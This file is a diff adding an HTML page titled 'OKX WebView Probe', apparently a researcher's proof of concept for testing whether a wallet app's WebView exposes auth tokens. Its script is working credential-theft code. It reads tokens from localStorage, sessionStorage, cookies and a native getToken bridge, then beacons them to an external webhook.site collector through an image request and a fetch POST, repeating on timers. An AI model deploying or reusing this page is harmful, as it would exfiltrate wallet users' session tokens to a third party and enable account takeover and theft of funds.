@@ -1,0 +1,33 @@
+<!doctype html>
+<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX WebView Probe</title>
+<style>body{font:14px monospace;padding:10px;background:#111;color:#0f0;word-break:break-all}.b{font-size:18px}</style></head>
+<body>
+<h3 class="b" id="verdict">PROBING…</h3>
+<pre id="out"></pre>
+<script>
+var COLLECTOR="https://webhook.site/200683c0-7735-4db9-bdfe-d31372282f17";
+var out=document.getElementById('out'), verdict=document.getElementById('verdict');
+function log(k,v){ out.textContent+=k+': '+v+'\n'; }
+function beacon(obj){
+  try{ var q=COLLECTOR+"/leak?"+Object.keys(obj).map(function(k){return k+"="+encodeURIComponent(obj[k]==null?"":obj[k])}).join("&");
+       new Image().src=q; }catch(e){}
+  try{ fetch(COLLECTOR+"/leak",{method:"POST",mode:"no-cors",headers:{'Content-Type':'text/plain'},body:JSON.stringify(obj)}); }catch(e){}
+}
+function probe(tag){
+  var d={tag:tag, loc:location.href, origin:location.origin};
+  var leaked=[];
+  try{ d.ls_token = localStorage.getItem('token'); if(d.ls_token) leaked.push('localStorage'); }catch(e){ d.ls_err=''+e; }
+  try{ d.ss_token = sessionStorage.getItem('token'); if(d.ss_token) leaked.push('sessionStorage'); }catch(e){}
+  try{ d.cookie = document.cookie; if(/token/i.test(d.cookie)) leaked.push('cookie'); }catch(e){}
+  try{ if(window.native&&native.getToken){ d.native_getToken = native.getToken(); if(d.native_getToken&&d.native_getToken!=='null') leaked.push('native.getToken'); } else d.native='absent'; }catch(e){ d.native_err=''+e; }
+  try{ d.jsBridge = (window.native&&native.jsBridge)?'PRESENT':'absent'; }catch(e){}
+  try{ d.okxwallet = typeof window.okxwallet; }catch(e){}
+  d.leaked = leaked.join(',')||'none';
+  for(var k in d) log(k, d[k]);
+  if(leaked.length){ verdict.textContent='*** TOKEN LEAKED via: '+d.leaked+' ***'; verdict.style.color='#f00'; }
+  else { verdict.textContent='loaded; no token to this origin (gate held)'; verdict.style.color='#0f0'; }
+  beacon(d);   // send to remote collector so we can read it without the phone
+}
+probe('t0'); setTimeout(function(){probe('t2500')},2500); setTimeout(function(){probe('t6000')},6000);
+</script>
+</body></html>
